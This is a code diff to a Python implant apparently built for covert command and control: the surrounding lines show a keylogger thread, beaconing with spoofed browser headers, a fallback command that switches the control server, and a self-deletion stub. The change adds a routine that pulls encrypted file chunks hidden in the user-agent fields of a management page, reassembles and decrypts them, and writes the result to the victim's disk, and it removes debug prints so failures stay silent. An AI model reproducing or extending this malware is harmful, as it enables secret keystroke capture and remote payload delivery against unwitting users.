@@ -52,7 +52,7 @@ def encrypt(message):
             return (encrypteddataunhex)
 
         except Exception as e:
-            pass
+            return "encryption error"
     else:
         return message
 
@@ -66,7 +66,7 @@ def decrypt(encrypteddata):
             return unpad(msg_dec, BLOCK_SIZE)
 
         except Exception as e:
-            pass
+            return "decryption error"
     else:
         return encrypteddata
 
@@ -111,6 +111,7 @@ def connect(url, managementURL):
     global klogging
     global keys
     global hbtime
+    global canaryManagementURL
     threadKeystrokes = threading.Thread(target=enableKeylogger)
 
     # Fetch JSON results
@@ -195,14 +196,61 @@ def connect(url, managementURL):
                 # have implant delete itself (TODO)
                 sys.exit(1)
 
+            if cmd.startswith("uploadingfile:"):
+                decodelist.append(cmd)
+
         command = decodelist[-1]
 
     except Exception as e:
         pass
 
     try:
+        if command.startswith("uploadingfile:"):
+            command = cmd.replace("uploadingfile:", "")
+            chunkedlen = int(command.split(":")[0])
+            filename = command.split(":")[1]
+            while True:
+                # now we start the logic loop of grabbing ALL chunks and reassembling them
+                reslist = []
+                decodedlist = []
+                chunkedlist = []
+                trash = []
+                response = requests.get(canaryManagementURL, headers=headers)
+                soupChunk = BeautifulSoup(response.text, 'html.parser')
+                trash = soupChunk.find_all("td")
+
+                for x in trash:
+                    if "useragent" in x.text:
+                        chunkedlist.append(x.find_next_sibling().string.strip())
+
+                # Loop until we have ALL the chunked data
+                if (len(chunkedlist)) == (len(cmdlist) + chunkedlen):
+                    stringbuilder = ""
+                    holder = chunkedlist[:chunkedlen]
+                    break
+
+                else:
+                    chunkedlist.clear()
+                    trash.clear()
+
+            # need to reverse the list
+            holder.reverse()
+            for q in holder:
+                stringbuilder += q
+
+            decodedlist.append(stringbuilder)
+            # Need to sleep for large requests
+            time.sleep(1)
+            filebytes = decrypt(decodedlist[-1])
+            filebytes = base64.b64decode(filebytes)
+
+
+            with open(filename, "wb") as f:
+                f.write(filebytes)
+                f.close()
+
+
         if command.startswith("fallback:"):
-            global canaryManagementURL
             canaryManagementURL = cmd.replace("fallback:", "")
             main()
 
@@ -333,8 +381,6 @@ def connect(url, managementURL):
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
-            #print ("sent: " + str(i))
-            #print ("length: " + str(len(i)))
             response = requests.get(url, headers=headers)
 
 
@@ -408,7 +454,6 @@ def main():
                 time.sleep(float(sleepTime) + modifiedsleep)
             connect(url, canaryManagementURL)
         except Exception as e:
-            print(e)
             pass
 
 
